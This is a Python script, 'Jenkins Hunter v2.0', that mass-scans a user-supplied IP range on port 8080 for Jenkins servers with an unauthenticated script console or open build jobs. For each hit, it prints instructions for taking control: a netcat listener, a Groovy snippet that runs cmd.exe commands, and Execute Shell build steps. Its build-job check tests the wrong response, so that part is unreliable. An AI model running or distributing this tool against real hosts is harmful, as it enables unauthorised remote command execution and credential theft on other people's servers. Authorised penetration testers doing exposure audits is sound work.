import socket
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
import requests

print("\n")
print("\033[92m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("*                                                                             *")
print("*                                                                             *")
print("*                    ___ ___ ,  . , . . ,  .  __                              *")
print("*                     |  |__ |\ | |/  | |\ | |__                              *")
print("*                   __|  |__ | \| |\  | | \| ___|                             *")
print("*                                                                             *")
print("*                      |          __   |   __   __                            *")
print("*                      |__  |  | |  | _|_ |__| |  |                           *")
print("*                      |  | |__| |  |  |   \__ |                              *")
print("*                                                                             *")
print("* Jenkins Hunter v2.0                                                         *")
print("* @cedowens                                                                   *")
print("* Independent Project                                                         *")
print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m")



count = 0
unauthjenkins = []
authjenkins = []
iplist = []
iprange = input("Enter IP range to check: ").strip()
port2 = 8080
numthreads = input("Enter the number of threads (For Mac, use a max of 250 unless you up the ulimit...on kali and most linux distros use a max of 1000 unless you up the ulimit): ").strip()
outfile = open("outfile.txt","w")
portopenlist = []
def Connector(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.6)
        result = sock.connect_ex((str(ip),port2))
        sock.close()
        if result == 0:
            print("\033[92mPort " + str(port2) + " OPEN on %s\033[0m" % str(ip))
            outfile.write("Port " + str(port2) + " OPEN on %s\n" % str(ip))
            portopenlist.append(str(ip))

    except Exception as e:
        print(e)

def threader():
    while True:
        worker = q.get()
        Connector(worker)
        q.task_done()



def jenkinschecker(host):
    url = "http://" + host + ":" + str(port2) + "/script"
    url2 = "http://" + host + ":" + str(port2) + "/view/default/newJob"
    try:
        response = requests.get(url, timeout=1)
        response2 = requests.get(url2, timeout=1)
        if (response.status_code == 200 and 'Jenkins' in response.text and 'Console' in response.text):
            print("+"*40)
            print("\033[91mHost with unauthenticated Jenkins:\033[0m")
            outfile.write("Host with unauthenticated Jenkins:\n")
            outfile.write(url)
            outfile.write("\n")
            unauthjenkins.append(host)
            print(url)
        elif (response.status_code != 200 and 'from=%2Fscript' in response.text):
            print("+"*40)
            print("\033[33mHost with authenticated Jenkins:\033[0m")
            outfile.write("Host with authenticated Jenkins:\n")
            print("http://" + host + ":" + str(port2))
            outfile.write("http://" + host + ":" + str(port2))
            outfile.write("\n")
            authjenkins.append(host)
        else:
            pass

        if (response2.status_code == 200 and 'build' in response.text):
            print("+"*40)
            print("\033[91mJenkins host allowing unauthenticated build jobs (can run shell commands):\033[0m")
            outfile.write("Jenkins host allowing unauthenticated build jobs (can run shell commands):\n")
            outfile.write(url2)
            outfile.write("\n")
            unauthjenkins.append(host)
            print(url2)
    except requests.exceptions.RequestException:
        pass


def threader2():
    while True:
        worker2 = q2.get()
        jenkinschecker(worker2)
        q2.task_done()

q = Queue()


for ip in ipaddress.IPv4Network(iprange):
    count = count + 1
    iplist.append(str(ip))

for x in range(int(numthreads)):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()



for worker in iplist:
    q.put(worker)



q.join()


q2 = Queue()

for y in range(200):
    t2 = threading.Thread(target=threader2)
    t2.daemon = True
    t2.start()

for worker2 in portopenlist:
    item = str(ipaddress.IPv4Address(worker2))
    print(item)
    q2.put(item)

q2.join()

if unauthjenkins != []:
    print("+"*40)
    print("If Jenkins is running on Linux, start a local netcat listener (ex: nc -nlvp <port>) and follow the steps here to get command shell access:")
    print("https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/")
    print('')
    print("If Jenkins is running on Windows, run Windows commands by typing the following into the script console:")
    print("def sout = new StringBuffer(), serr = new StringBuffer()")
    print("def proc = 'cmd.exe /c <command>'.execute()")
    print("proc.waitForKill(1000)")
    print('println "out> $sout err> $serr"')
    print("+"*40)
    print("If any Jenkins hosts found allowing unauthenticated build jobs, you can simply run a single build step with an Execute Shell command, save, build, and view console output to see the results of your command")
    print("+"*40)
if unauthjenkins == []:
    print("+"*40)
    print("No instances of unauthenticated Jenkins found.")
    outfile.write("No instances of unauthenticated Jenkins found.\n")

if authjenkins == []:
    print("No instances of authenticated Jenkins found.")
    outfile.write("No instances of authenticated Jenkins found.\n")

outfile.close()
print("+"*40)
print("DONE!")
print("Data written to outfile.txt in the current directory.")
print("+"*40)
